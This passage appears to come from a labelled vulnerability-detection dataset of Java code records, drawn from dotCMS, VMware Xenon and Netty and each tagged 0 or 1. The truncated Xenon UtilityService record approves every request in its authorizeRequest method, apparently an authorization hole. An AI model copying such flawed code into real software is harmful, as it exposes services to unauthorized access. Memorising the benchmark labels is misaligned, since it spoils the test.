)*(>|(&gt;))\",value);\n\t\t\t}\n\t\t}\n\n\t\tif(UtilMethods.isSet(user))\n\t\t{\n\t\t\tAddress address = new Address();\n\t\t\ttry {\n\t\t\t\tList<Address> adds = PublicAddressFactory.getAddressesByUserId(user.getUserId());\n\t\t\t\tif (adds != null && adds.size() > 0) {\n\t\t\t\t\taddress = (Address) adds.get(0);\n\t\t\t\t}\n\t\t\t}\n\t\t\tcatch(Exception e) {\n\t\t\t\t\tLogger.error(EmailFactory.class, \"Send To Friend Failed\" + e);\n\t\t\t}\n\n\t\t\t//Variables replacement from user object\n\t\t\tfinalMessageStr = finalMessageStr.replaceAll(\"(?i)(<|(&lt;))/varName(>|(&gt;))\", \"\");\n\t\t\tfinalMessageStr = finalMessageStr.replaceAll(\"(?i)(<|(&lt;))varName(\\\")?( )*/*( )*(>|(&gt;))\", (user.getFirstName()!=null) ? user.getFirstName() : \"\");\n\n\t\t\tfinalMessageStr = finalMessageStr.replaceAll(\"(?i)(<|(&lt;))/varEmail(>|(&gt;))\", \"\");\n\t\t\tfinalMessageStr = finalMessageStr.replaceAll(\"(?i)(<|(&lt;))varEmail(\\\")?( )*/*( )*(>|(&gt;))\", (user.getEmailAddress()!=null) ? user.getEmailAddress() : \"\");\n\n\t\t\tfinalMessageStr = finalMessageStr.replaceAll(\"(?i)(<|(&lt;))/varMiddleName(>|(&gt;))\", \"\");\n\t\t\tfinalMessageStr = finalMessageStr.replaceAll(\"(?i)(<|(&lt;))varMiddleName(\\\")?( )*/*( )*(>|(&gt;))\", (user.getMiddleName()!=null) ? user.getMiddleName() : \"\");\n\n\t\t\tfinalMessageStr = finalMessageStr.replaceAll(\"(?i)(<|(&lt;))/varLastName(>|(&gt;))\", \"\");\n\t\t\tfinalMessageStr = finalMessageStr.replaceAll(\"(?i)(<|(&lt;))varLastName(\\\")?( )*/*( )*(>|(&gt;))\", (user.getLastName()!=null) ? user.getLastName() : \"\");\n\n\t\t\tUserProxy userproxy;\n\t\t\ttry {\n\t\t\t\tuserproxy = com.dotmarketing.business.APILocator.getUserProxyAPI().getUserProxy(user,APILocator.getUserAPI().getSystemUser(), false);\n\t\t\t} catch (Exception e) {\n\t\t\t\tLogger.error(EmailFactory.class, e.getMessage(), e);\n\t\t\t\tthrow new DotRuntimeException(e.getMessage(), e);\n\t\t\t}\t\n\t\t\tfinalMessageStr = finalMessageStr.replaceAll(\"(?i)(<|(&lt;))/varLastMessage(>|(&gt;))\", \"\");\n\t\t\tfinalMessageStr = finalMessageStr.replaceAll(\"(?i)(<|(&lt;))varLastMessage(\\\")?( )*/*( )*(>|(&gt;))\", (userproxy.getLastMessage()!=null) ? userproxy.getLastMessage() : \"\");\n\n\t\t\tfinalMessageStr = finalMessageStr.replaceAll(\"(?i)(<|(&lt;))/varAddress1(>|(&gt;))\", \"\");\n\t\t\tfinalMessageStr = finalMessageStr.replaceAll(\"(?i)(<|(&lt;))varAddress1(\\\")?( )*/*( )*(>|(&gt;))\", (address.getStreet1()!=null) ? address.getStreet1() : \"\");\n\n\t\t\tfinalMessageStr = finalMessageStr.replaceAll(\"(?i)(<|(&lt;))/varAddress2(>|(&gt;))\", \"\");\n\t\t\tfinalMessageStr = finalMessageStr.replaceAll(\"(?i)(<|(&lt;))varAddress2(\\\")?( )*/*( )*(>|(&gt;))\", (address.getStreet2()!=null) ? address.getStreet2() : \"\");\n\n\t\t\tfinalMessageStr = finalMessageStr.replaceAll(\"(?i)(<|(&lt;))/varPhone(>|(&gt;))\", \"\");\n\t\t\tfinalMessageStr = finalMessageStr.replaceAll(\"(?i)(<|(&lt;))varPhone(\\\")?( )*/*( )*(>|(&gt;))\", (address.getPhone()!=null) ? address.getPhone() : \"\");\n\n\t\t\tfinalMessageStr = finalMessageStr.replaceAll(\"(?i)(<|(&lt;))/varState(>|(&gt;))\", \"\");\n\t\t\tfinalMessageStr = finalMessageStr.replaceAll(\"(?i)(<|(&lt;))varState(\\\")?( )*/*( )*(>|(&gt;))\", (address.getState()!=null) ? address.getState() : \"\");\n\n\t\t\tfinalMessageStr = finalMessageStr.replaceAll(\"(?i)(<|(&lt;))/varCity(>|(&gt;))\", \"\");\n\t\t\tfinalMessageStr = finalMessageStr.replaceAll(\"(?i)(<|(&lt;))varCity(\\\")?( )*/*( )*(>|(&gt;))\", (address.getCity()!=null) ? address.getCity() : \"\");\n\n\t\t\tfinalMessageStr = finalMessageStr.replaceAll(\"(?i)(<|(&lt;))/varCountry(>|(&gt;))\", \"\");\n\t\t\tfinalMessageStr = finalMessageStr.replaceAll(\"(?i)(<|(&lt;))varCountry(\\\")?( )*/*( )*(>|(&gt;))\", (address.getCountry()!=null) ? address.getCountry() : \"\");\n\n\t\t\tfinalMessageStr = finalMessageStr.replaceAll(\"(?i)(<|(&lt;))/varZip(>|(&gt;))\", \"\");\n\t\t\tfinalMessageStr = finalMessageStr.replaceAll(\"(?i)(<|(&lt;))varZip(\\\")?( )*/*( )*(>|(&gt;))\", (address.getZip()!=null) ? address.getZip() : \"\");\n\n\t\t\t//gets default company to get locale\n\t\t\tCompany comp = PublicCompanyFactory.getDefaultCompany();\n\n\t\t\ttry {\n\n\t\t\t\tint varCounter = 1;\n\n\t\t\t\tfor (;varCounter < 26;varCounter++) {\n\t\t\t\t\tString var = LanguageUtil.get(comp.getCompanyId(), comp.getLocale(), \"user.profile.var\" + varCounter);\n\t\t\t\t\tif (var!=null) var = var.replaceAll(\" \",\"_\");\n\n\t\t\t\t\tString value = \"\";\n\t\t\t\t\ttry {\n\t\t\t\t\t\tvalue = BeanUtils.getSimpleProperty(userproxy, \"var\" + varCounter);\n\t\t\t\t\t} catch (Exception e) {\n\t\t\t\t\t\tLogger.error(EmailFactory.class, \"An error as ocurred trying to access the variable var\" + varCounter + \" from the user proxy.\", e);\n\t\t\t\t\t}\n\n\t\t\t\t\tfinalMessageStr = finalMessageStr.replaceAll(\"(?i)(<|(&lt;))/\"+var+\"(>|(&gt;))\", \"\");\n\t\t\t\t\tfinalMessageStr = finalMessageStr.replaceAll(\"(?i)(<|(&lt;))\" + var + \"(\\\")?( )*/*( )*(>|(&gt;))\", (value != null) ? value : \"\");\n\n\t\t\t\t\tfinalMessageStr = finalMessageStr.replaceAll(\"(?i)(<|(&lt;))/var\" + varCounter + \"(>|(&gt;))\", \"\");\n\t\t\t\t\tfinalMessageStr = finalMessageStr.replaceAll(\"(?i)(<|(&lt;))var\" + varCounter + \"(\\\")?( )*/*( )*(>|(&gt;))\", (value != null) ? value : \"\");\n\t\t\t\t}\n\n\t\t\t} catch(LanguageException le) {\n\t\t\t\tLogger.error(EmailFactory.class, le.getMessage());\n\t\t\t}\n\t\t}\n\t\treturn finalMessageStr;\n\t}\n\n\tpublic static Object getMapValue(String key, Map<String, Object> map) {\n\n\t\ttry {\n\t\t\ttry\n\t\t\t{\n\t\t\t\tif(((Object[]) map.get(key)).length > 1)\n\t\t\t\t{\n\t\t\t\t\tString returnValue = \"\";\n\t\t\t\t\tfor(Object object : ((Object[]) map.get(key)))\n\t\t\t\t\t{\n\t\t\t\t\t\treturnValue += object.toString() + \", \";\t\t\t\t\t\t\n\t\t\t\t\t}\n\t\t\t\t\treturnValue = returnValue.substring(0,returnValue.lastIndexOf(\",\"));\n\t\t\t\t\treturn returnValue;\n\t\t\t\t}\n\t\t\t}\n\t\t\tcatch(Exception ex)\n\t\t\t{}\n\t\t\treturn ((Object[]) map.get(key))[0];\n\t\t\t\n\t\t} catch (Exception e) {\n\t\t\ttry {\n\t\t\t\treturn (Object) map.get(key);\n\t\t\t} catch (Exception ex) {\n\t\t\t\treturn null;\n\t\t\t}\n\n\t\t}\n\n\t}\t\n\n}\n", "target": 0}
{"idx": 1064, "func": "/*\n * Copyright (c) 2014-2015 VMware, Inc. All Rights Reserved.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\"); you may not\n * use this file except in compliance with the License.  You may obtain a copy of\n * the License at http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software distributed\n * under the License is distributed on an \"AS IS\" BASIS, without warranties or\n * conditions of any kind, EITHER EXPRESS OR IMPLIED.  See the License for the\n * specific language governing permissions and limitations under the License.\n */\n\npackage com.vmware.xenon.common;\n\nimport static org.junit.Assert.assertNotNull;\nimport static org.junit.Assert.assertTrue;\n\nimport static com.vmware.xenon.services.common.authn.BasicAuthenticationUtils.constructBasicAuth;\n\nimport java.net.URI;\nimport java.util.Date;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.TimeoutException;\n\nimport org.junit.Test;\nimport org.junit.rules.TemporaryFolder;\n\nimport com.vmware.xenon.services.common.ExampleServiceHost;\nimport com.vmware.xenon.services.common.ServiceUriPaths;\nimport com.vmware.xenon.services.common.UserService;\nimport com.vmware.xenon.services.common.authn.AuthenticationRequest;\nimport com.vmware.xenon.services.common.authn.BasicAuthenticationService;\n\npublic class TestExampleServiceHost extends BasicReusableHostTestCase {\n\n    private static final String adminUser = \"admin@localhost\";\n    private static final String exampleUser = \"example@localhost\";\n\n    /**\n     * Verify that the example service host creates users as expected.\n     *\n     * In theory we could test that authentication and authorization works correctly\n     * for these users. It's not critical to do here since we already test it in\n     * TestAuthSetupHelper.\n     */\n    @Test\n    public void createUsers() throws Throwable {\n        ExampleServiceHost h = new ExampleServiceHost();\n        TemporaryFolder tmpFolder = new TemporaryFolder();\n        tmpFolder.create();\n        try {\n            String bindAddress = \"127.0.0.1\";\n\n            String[] args = {\n                    \"--sandbox=\"\n                            + tmpFolder.getRoot().getAbsolutePath(),\n                    \"--port=0\",\n                    \"--bindAddress=\" + bindAddress,\n                    \"--isAuthorizationEnabled=\" + Boolean.TRUE.toString(),\n                    \"--adminUser=\" + adminUser,\n                    \"--adminUserPassword=\" + adminUser,\n                    \"--exampleUser=\" + exampleUser,\n                    \"--exampleUserPassword=\" + exampleUser,\n            };\n\n            h.initialize(args);\n            h.setMaintenanceIntervalMicros(TimeUnit.MILLISECONDS.toMicros(100));\n            h.start();\n\n            URI hostUri = h.getUri();\n            String authToken = loginUser(hostUri);\n            waitForUsers(hostUri, authToken);\n\n        } finally {\n            h.stop();\n            tmpFolder.delete();\n        }\n    }\n\n    /**\n     * Supports createUsers() by logging in as the admin. The admin user\n     * isn't created immediately, so this polls.\n     */\n    private String loginUser(URI hostUri) throws Throwable {\n        URI usersLink = UriUtils.buildUri(hostUri, UserService.FACTORY_LINK);\n        // wait for factory availability\n        this.host.waitForReplicatedFactoryServiceAvailable(usersLink);\n\n        String basicAuth = constructBasicAuth(adminUser, adminUser);\n        URI loginUri = UriUtils.buildUri(hostUri, ServiceUriPaths.CORE_AUTHN_BASIC);\n        AuthenticationRequest login = new AuthenticationRequest();\n        login.requestType = AuthenticationRequest.AuthenticationRequestType.LOGIN;\n\n        String[] authToken = new String[1];\n        authToken[0] = null;\n\n        Date exp = this.host.getTestExpiration();\n        while (new Date().before(exp)) {\n            Operation loginPost = Operation.createPost(loginUri)\n                    .setBody(login)\n                    .addRequestHeader(BasicAuthenticationService.AUTHORIZATION_HEADER_NAME,\n                            basicAuth)\n                    .forceRemote()\n                    .setCompletion((op, ex) -> {\n                        if (ex != null) {\n                            this.host.completeIteration();\n                            return;\n                        }\n                        authToken[0] = op.getResponseHeader(Operation.REQUEST_AUTH_TOKEN_HEADER);\n                        this.host.completeIteration();\n                    });\n\n            this.host.testStart(1);\n            this.host.send(loginPost);\n            this.host.testWait();\n\n            if (authToken[0] != null) {\n                break;\n            }\n            Thread.sleep(250);\n        }\n\n        if (new Date().after(exp)) {\n            throw new TimeoutException();\n        }\n\n        assertNotNull(authToken[0]);\n\n        return authToken[0];\n    }\n\n    /**\n     * Supports createUsers() by waiting for two users to be created. They aren't created immediately,\n     * so this polls.\n     */\n    private void waitForUsers(URI hostUri, String authToken) throws Throwable {\n        URI usersLink = UriUtils.buildUri(hostUri, UserService.FACTORY_LINK);\n        Integer[] numberUsers = new Integer[1];\n        for (int i = 0; i < 20; i++) {\n            Operation get = Operation.createGet(usersLink)\n                    .forceRemote()\n                    .addRequestHeader(Operation.REQUEST_AUTH_TOKEN_HEADER, authToken)\n                    .setCompletion((op, ex) -> {\n                        if (ex != null) {\n                            if (op.getStatusCode() != Operation.STATUS_CODE_FORBIDDEN) {\n                                this.host.failIteration(ex);\n                                return;\n                            } else {\n                                numberUsers[0] = 0;\n                                this.host.completeIteration();\n                                return;\n                            }\n                        }\n                        ServiceDocumentQueryResult response = op\n                                .getBody(ServiceDocumentQueryResult.class);\n                        assertTrue(response != null && response.documentLinks != null);\n                        numberUsers[0] = response.documentLinks.size();\n                        this.host.completeIteration();\n                    });\n\n            this.host.testStart(1);\n            this.host.send(get);\n            this.host.testWait();\n\n            if (numberUsers[0] == 2) {\n                break;\n            }\n            Thread.sleep(250);\n        }\n        assertTrue(numberUsers[0] == 2);\n    }\n\n}\n", "target": 1}
{"idx": 1065, "func": "/*\n * Copyright 2014 The Netty Project\n *\n * The Netty Project licenses this file to you under the Apache License,\n * version 2.0 (the \"License\"); you may not use this file except in compliance\n * with the License. You may obtain a copy of the License at:\n *\n *   https://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n * License for the specific language governing permissions and limitations\n * under the License.\n */\n\npackage io.netty.handler.ssl.util;\n\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport io.netty.handler.codec.base64.Base64;\nimport io.netty.util.CharsetUtil;\nimport io.netty.util.internal.PlatformDependent;\nimport io.netty.util.internal.SystemPropertyUtil;\nimport io.netty.util.internal.ThrowableUtil;\nimport io.netty.util.internal.logging.InternalLogger;\nimport io.netty.util.internal.logging.InternalLoggerFactory;\n\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.nio.file.Files;\nimport java.security.KeyPair;\nimport java.security.KeyPairGenerator;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.PrivateKey;\nimport java.security.SecureRandom;\nimport java.security.cert.CertificateEncodingException;\nimport java.security.cert.CertificateException;\nimport java.security.cert.CertificateFactory;\nimport java.security.cert.X509Certificate;\nimport java.util.Date;\n\n/**\n * Generates a temporary self-signed certificate for testing purposes.\n * <p>\n * <strong>NOTE:</strong>\n * Never use the certificate and private key generated by this class in production.\n * It is purely for testing purposes, and thus it is very insecure.\n * It even uses an insecure pseudo-random generator for faster generation internally.\n * </p><p>\n * An X.509 certificate file and a EC/RSA private key file are generated in a system's temporary directory using\n * {@link java.io.File#createTempFile(String, String)}, and they are deleted when the JVM exits using\n * {@link java.io.File#deleteOnExit()}.\n * </p><p>\n * At first, this method tries to use OpenJDK's X.509 implementation (the {@code sun.security.x509} package).\n * If it fails, it tries to use <a href=\"https://www.bouncycastle.org/\">Bouncy Castle</a> as a fallback.\n * </p>\n */\npublic final class SelfSignedCertificate {\n\n    private static final InternalLogger logger = InternalLoggerFactory.getInstance(SelfSignedCertificate.class);\n\n    /** Current time minus 1 year, just in case software clock goes back due to time synchronization */\n    private static final Date DEFAULT_NOT_BEFORE = new Date(SystemPropertyUtil.getLong(\n            \"io.netty.selfSignedCertificate.defaultNotBefore\", System.currentTimeMillis() - 86400000L * 365));\n    /** The maximum possible value in X.509 specification: 9999-12-31 23:59:59 */\n    private static final Date DEFAULT_NOT_AFTER = new Date(SystemPropertyUtil.getLong(\n            \"io.netty.selfSignedCertificate.defaultNotAfter\", 253402300799000L));\n\n    /**\n     * FIPS 140-2 encryption requires the RSA key length to be 2048 bits or greater.\n     * Let's use that as a sane default but allow the default to be set dynamically\n     * for those that need more stringent security requirements.\n     */\n    private static final int DEFAULT_KEY_LENGTH_BITS =\n            SystemPropertyUtil.getInt(\"io.netty.handler.ssl.util.selfSignedKeyStrength\", 2048);\n\n    private final File certificate;\n    private final File privateKey;\n    private final X509Certificate cert;\n    private final PrivateKey key;\n\n    /**\n     * Creates a new instance.\n     * <p> Algorithm: RSA </p>\n     */\n    public SelfSignedCertificate() throws CertificateException {\n        this(DEFAULT_NOT_BEFORE, DEFAULT_NOT_AFTER, \"RSA\", DEFAULT_KEY_LENGTH_BITS);\n    }\n\n    /**\n     * Creates a new instance.\n     * <p> Algorithm: RSA </p>\n     *\n     * @param notBefore Certificate is not valid before this time\n     * @param notAfter  Certificate is not valid after this time\n     */\n    public SelfSignedCertificate(Date notBefore, Date notAfter)\n            throws CertificateException {\n        this(\"localhost\", notBefore, notAfter, \"RSA\", DEFAULT_KEY_LENGTH_BITS);\n    }\n\n    /**\n     * Creates a new instance.\n     *\n     * @param notBefore Certificate is not valid before this time\n     * @param notAfter  Certificate is not valid after this time\n     * @param algorithm Key pair algorithm\n     * @param bits      the number of bits of the generated private key\n     */\n    public SelfSignedCertificate(Date notBefore, Date notAfter, String algorithm, int bits)\n            throws CertificateException {\n        this(\"localhost\", notBefore, notAfter, algorithm, bits);\n    }\n\n    /**\n     * Creates a new instance.\n     * <p> Algorithm: RSA </p>\n     *\n     * @param fqdn a fully qualified domain name\n     */\n    public SelfSignedCertificate(String fqdn) throws CertificateException {\n        this(fqdn, DEFAULT_NOT_BEFORE, DEFAULT_NOT_AFTER, \"RSA\", DEFAULT_KEY_LENGTH_BITS);\n    }\n\n    /**\n     * Creates a new instance.\n     *\n     * @param fqdn      a fully qualified domain name\n     * @param algorithm Key pair algorithm\n     * @param bits      the number of bits of the generated private key\n     */\n    public SelfSignedCertificate(String fqdn, String algorithm, int bits) throws CertificateException {\n        this(fqdn, DEFAULT_NOT_BEFORE, DEFAULT_NOT_AFTER, algorithm, bits);\n    }\n\n    /**\n     * Creates a new instance.\n     * <p> Algorithm: RSA </p>\n     *\n     * @param fqdn      a fully qualified domain name\n     * @param notBefore Certificate is not valid before this time\n     * @param notAfter  Certificate is not valid after this time\n     */\n    public SelfSignedCertificate(String fqdn, Date notBefore, Date notAfter) throws CertificateException {\n        // Bypass entropy collection by using insecure random generator.\n        // We just want to generate it without any delay because it's for testing purposes only.\n        this(fqdn, ThreadLocalInsecureRandom.current(), DEFAULT_KEY_LENGTH_BITS, notBefore, notAfter, \"RSA\");\n    }\n\n    /**\n     * Creates a new instance.\n     *\n     * @param fqdn      a fully qualified domain name\n     * @param notBefore Certificate is not valid before this time\n     * @param notAfter  Certificate is not valid after this time\n     * @param algorithm Key pair algorithm\n     * @param bits      the number of bits of the generated private key\n     */\n    public SelfSignedCertificate(String fqdn, Date notBefore, Date notAfter, String algorithm, int bits)\n            throws CertificateException {\n        // Bypass entropy collection by using insecure random generator.\n        // We just want to generate it without any delay because it's for testing purposes only.\n        this(fqdn, ThreadLocalInsecureRandom.current(), bits, notBefore, notAfter, algorithm);\n    }\n\n    /**\n     * Creates a new instance.\n     * <p> Algorithm: RSA </p>\n     *\n     * @param fqdn      a fully qualified domain name\n     * @param random    the {@link SecureRandom} to use\n     * @param bits      the number of bits of the generated private key\n     */\n    public SelfSignedCertificate(String fqdn, SecureRandom random, int bits)\n            throws CertificateException {\n        this(fqdn, random, bits, DEFAULT_NOT_BEFORE, DEFAULT_NOT_AFTER, \"RSA\");\n    }\n\n    /**\n     * Creates a new instance.\n     *\n     * @param fqdn      a fully qualified domain name\n     * @param random    the {@link SecureRandom} to use\n     * @param algorithm Key pair algorithm\n     * @param bits      the number of bits of the generated private key\n     */\n    public SelfSignedCertificate(String fqdn, SecureRandom random, String algorithm, int bits)\n            throws CertificateException {\n        this(fqdn, random, bits, DEFAULT_NOT_BEFORE, DEFAULT_NOT_AFTER, algorithm);\n    }\n\n    /**\n     * Creates a new instance.\n     * <p> Algorithm: RSA </p>\n     *\n     * @param fqdn      a fully qualified domain name\n     * @param random    the {@link SecureRandom} to use\n     * @param bits      the number of bits of the generated private key\n     * @param notBefore Certificate is not valid before this time\n     * @param notAfter  Certificate is not valid after this time\n     */\n    public SelfSignedCertificate(String fqdn, SecureRandom random, int bits, Date notBefore, Date notAfter)\n            throws CertificateException {\n        this(fqdn, random, bits, notBefore, notAfter, \"RSA\");\n    }\n\n    /**\n     * Creates a new instance.\n     *\n     * @param fqdn      a fully qualified domain name\n     * @param random    the {@link SecureRandom} to use\n     * @param bits      the number of bits of the generated private key\n     * @param notBefore Certificate is not valid before this time\n     * @param notAfter  Certificate is not valid after this time\n     * @param algorithm Key pair algorithm\n     */\n    public SelfSignedCertificate(String fqdn, SecureRandom random, int bits, Date notBefore, Date notAfter,\n                                 String algorithm) throws CertificateException {\n\n        if (!algorithm.equalsIgnoreCase(\"EC\") && !algorithm.equalsIgnoreCase(\"RSA\")) {\n            throw new IllegalArgumentException(\"Algorithm not valid: \" + algorithm);\n        }\n\n        final KeyPair keypair;\n        try {\n            KeyPairGenerator keyGen = KeyPairGenerator.getInstance(algorithm);\n            keyGen.initialize(bits, random);\n            keypair = keyGen.generateKeyPair();\n        } catch (NoSuchAlgorithmException e) {\n            // Should not reach here because every Java implementation must have RSA and EC key pair generator.\n            throw new Error(e);\n        }\n\n        String[] paths;\n        try {\n            // Try the OpenJDK's proprietary implementation.\n            paths = OpenJdkSelfSignedCertGenerator.generate(fqdn, keypair, random, notBefore, notAfter, algorithm);\n        } catch (Throwable t) {\n            logger.debug(\"Failed to generate a self-signed X.509 certificate using sun.security.x509:\", t);\n            try {\n                // Try Bouncy Castle if the current JVM didn't have sun.security.x509.\n                paths = BouncyCastleSelfSignedCertGenerator.generate(\n                        fqdn, keypair, random, notBefore, notAfter, algorithm);\n            } catch (Throwable t2) {\n                logger.debug(\"Failed to generate a self-signed X.509 certificate using Bouncy Castle:\", t2);\n                final CertificateException certificateException = new CertificateException(\n                        \"No provider succeeded to generate a self-signed certificate. \" +\n                                \"See debug log for the root cause.\", t2);\n                ThrowableUtil.addSuppressed(certificateException, t);\n                throw certificateException;\n            }\n        }\n\n        certificate = new File(paths[0]);\n        privateKey = new File(paths[1]);\n        key = keypair.getPrivate();\n        FileInputStream certificateInput = null;\n        try {\n            certificateInput = new FileInputStream(certificate);\n            cert = (X509Certificate) CertificateFactory.getInstance(\"X509\").generateCertificate(certificateInput);\n        } catch (Exception e) {\n            throw new CertificateEncodingException(e);\n        } finally {\n            if (certificateInput != null) {\n                try {\n                    certificateInput.close();\n                } catch (IOException e) {\n                    if (logger.isWarnEnabled()) {\n                        logger.warn(\"Failed to close a file: \" + certificate, e);\n                    }\n                }\n            }\n        }\n    }\n\n    /**\n     * Returns the generated X.509 certificate file in PEM format.\n     */\n    public File certificate() {\n        return certificate;\n    }\n\n    /**\n     * Returns the generated RSA private key file in PEM format.\n     */\n    public File privateKey() {\n        return privateKey;\n    }\n\n    /**\n     *  Returns the generated X.509 certificate.\n     */\n    public X509Certificate cert() {\n        return cert;\n    }\n\n    /**\n     * Returns the generated RSA private key.\n     */\n    public PrivateKey key() {\n        return key;\n    }\n\n    /**\n     * Deletes the generated X.509 certificate file and RSA private key file.\n     */\n    public void delete() {\n        safeDelete(certificate);\n        safeDelete(privateKey);\n    }\n\n    static String[] newSelfSignedCertificate(\n            String fqdn, PrivateKey key, X509Certificate cert) throws IOException, CertificateEncodingException {\n        // Encode the private key into a file.\n        ByteBuf wrappedBuf = Unpooled.wrappedBuffer(key.getEncoded());\n        ByteBuf encodedBuf;\n        final String keyText;\n        try {\n            encodedBuf = Base64.encode(wrappedBuf, true);\n            try {\n                keyText = \"-----BEGIN PRIVATE KEY-----\\n\" +\n                        encodedBuf.toString(CharsetUtil.US_ASCII) +\n                        \"\\n-----END PRIVATE KEY-----\\n\";\n            } finally {\n                encodedBuf.release();\n            }\n        } finally {\n            wrappedBuf.release();\n        }\n\n        File keyFile = PlatformDependent.createTempFile(\"keyutil_\" + fqdn + '_', \".key\", null);\n        keyFile.deleteOnExit();\n\n        OutputStream keyOut = new FileOutputStream(keyFile);\n        try {\n            keyOut.write(keyText.getBytes(CharsetUtil.US_ASCII));\n            keyOut.close();\n            keyOut = null;\n        } finally {\n            if (keyOut != null) {\n                safeClose(keyFile, keyOut);\n                safeDelete(keyFile);\n            }\n        }\n\n        wrappedBuf = Unpooled.wrappedBuffer(cert.getEncoded());\n        final String certText;\n        try {\n            encodedBuf = Base64.encode(wrappedBuf, true);\n            try {\n                // Encode the certificate into a CRT file.\n                certText = \"-----BEGIN CERTIFICATE-----\\n\" +\n                        encodedBuf.toString(CharsetUtil.US_ASCII) +\n                        \"\\n-----END CERTIFICATE-----\\n\";\n            } finally {\n                encodedBuf.release();\n            }\n        } finally {\n            wrappedBuf.release();\n        }\n\n        File certFile = PlatformDependent.createTempFile(\"keyutil_\" + fqdn + '_', \".crt\", null);\n        certFile.deleteOnExit();\n\n        OutputStream certOut = new FileOutputStream(certFile);\n        try {\n            certOut.write(certText.getBytes(CharsetUtil.US_ASCII));\n            certOut.close();\n            certOut = null;\n        } finally {\n            if (certOut != null) {\n                safeClose(certFile, certOut);\n                safeDelete(certFile);\n                safeDelete(keyFile);\n            }\n        }\n\n        return new String[] { certFile.getPath(), keyFile.getPath() };\n    }\n\n    private static void safeDelete(File certFile) {\n        if (!certFile.delete()) {\n            if (logger.isWarnEnabled()) {\n                logger.warn(\"Failed to delete a file: \" + certFile);\n            }\n        }\n    }\n\n    private static void safeClose(File keyFile, OutputStream keyOut) {\n        try {\n            keyOut.close();\n        } catch (IOException e) {\n            if (logger.isWarnEnabled()) {\n                logger.warn(\"Failed to close a file: \" + keyFile, e);\n            }\n        }\n    }\n}\n", "target": 0}
{"idx": 1066, "func": "/*\n * Copyright (c) 2014-2015 VMware, Inc. All Rights Reserved.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\"); you may not\n * use this file except in compliance with the License.  You may obtain a copy of\n * the License at http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software distributed\n * under the License is distributed on an \"AS IS\" BASIS, without warranties or\n * conditions of any kind, EITHER EXPRESS OR IMPLIED.  See the License for the\n * specific language governing permissions and limitations under the License.\n */\n\npackage com.vmware.xenon.common;\n\nimport static com.vmware.xenon.common.Service.Action.DELETE;\nimport static com.vmware.xenon.common.Service.Action.POST;\n\nimport java.io.NotActiveException;\nimport java.io.UnsupportedEncodingException;\nimport java.net.URI;\nimport java.net.URLDecoder;\nimport java.net.UnknownHostException;\nimport java.util.ArrayList;\nimport java.util.EnumSet;\nimport java.util.HashMap;\nimport java.util.Iterator;\nimport java.util.List;\nimport java.util.Map.Entry;\nimport java.util.TreeMap;\nimport java.util.concurrent.ConcurrentSkipListMap;\nimport java.util.logging.Level;\n\nimport com.vmware.xenon.common.Operation.AuthorizationContext;\nimport com.vmware.xenon.common.Operation.CompletionHandler;\nimport com.vmware.xenon.common.Operation.OperationOption;\nimport com.vmware.xenon.common.ServiceDocumentDescription.TypeName;\nimport com.vmware.xenon.common.ServiceStats.ServiceStat;\nimport com.vmware.xenon.common.ServiceStats.TimeSeriesStats;\nimport com.vmware.xenon.common.ServiceSubscriptionState.ServiceSubscriber;\nimport com.vmware.xenon.services.common.QueryTask;\nimport com.vmware.xenon.services.common.QueryTask.NumericRange;\nimport com.vmware.xenon.services.common.QueryTask.Query;\nimport com.vmware.xenon.services.common.QueryTask.Query.Occurance;\nimport com.vmware.xenon.services.common.QueryTask.QueryTerm;\nimport com.vmware.xenon.services.common.QueryTask.QueryTerm.MatchType;\nimport com.vmware.xenon.services.common.ServiceUriPaths;\nimport com.vmware.xenon.services.common.UiContentService;\n\n/**\n * Utility service managing the various URI control REST APIs for each service instance. A single\n * utility service instance manages operations on multiple URI suffixes (/stats, /subscriptions,\n * etc) in order to reduce runtime overhead per service instance\n */\npublic class UtilityService implements Service {\n    private transient Service parent;\n    private ServiceStats stats;\n    private ServiceSubscriptionState subscriptions;\n    private UiContentService uiService;\n\n    public UtilityService() {\n    }\n\n    public UtilityService setParent(Service parent) {\n        this.parent = parent;\n        return this;\n    }\n\n    @Override\n    public void authorizeRequest(Operation op) {\n        op.complete();\n    }\n\n    @Override\n    public void handleRequest(Operation op) {\n        String uriPrefix = this.parent.getSelfLink() + ServiceHost.SERVICE_URI_SUFFIX_UI;\n\n        if (op.getUri().getPath().startsWith(uriPrefix)) {\n            // startsWith catches all /factory/instance/ui/some-script.js\n            handleUiRequest(op);\n        } else if (op.getUri().getPath().endsWith(ServiceHost.SERVICE_URI_SUFFIX_STATS)) {\n            handleStatsRequest(op);\n        } else if (op.getUri().getPath().endsWith(ServiceHost.SERVICE_URI_SUFFIX_SUBSCRIPTIONS)) {\n            handleSubscriptionsRequest(op);\n        } else if (op.getUri().getPath().endsWith(ServiceHost.SERVICE_URI_SUFFIX_TEMPLATE)) {\n            handleDocumentTemplateRequest(op);\n        } else if (op.getUri().getPath().endsWith(ServiceHost.SERVICE_URI_SUFFIX_CONFIG)) {\n            this.parent.handleConfigurationRequest(op);\n        } else if (op.getUri().getPath().endsWith(ServiceHost.SERVICE_URI_SUFFIX_AVAILABLE)) {\n            handleAvailableRequest(op);\n        } else {\n            op.fail(new UnknownHostException());\n        }\n    }\n\n    @Override\n    public void handleCreate(Operation post) {\n        post.complete();\n    }\n\n    @Override\n    public void handleStart(Operation startPost) {\n        startPost.complete();\n    }\n\n    @Override\n    public void handleStop(Operation op) {\n        op.complete();\n    }\n\n    @Override\n    public void handleRequest(Operation op, OperationProcessingStage opProcessingStage) {\n        handleRequest(op);\n    }\n\n    private void handleAvailableRequest(Operation op) {\n        if (op.getAction() == Action.GET) {\n            if (this.parent.getProcessingStage() != ProcessingStage.PAUSED\n                    && this.parent.getProcessingStage() != ProcessingStage.AVAILABLE) {\n                // processing stage takes precedence over isAvailable 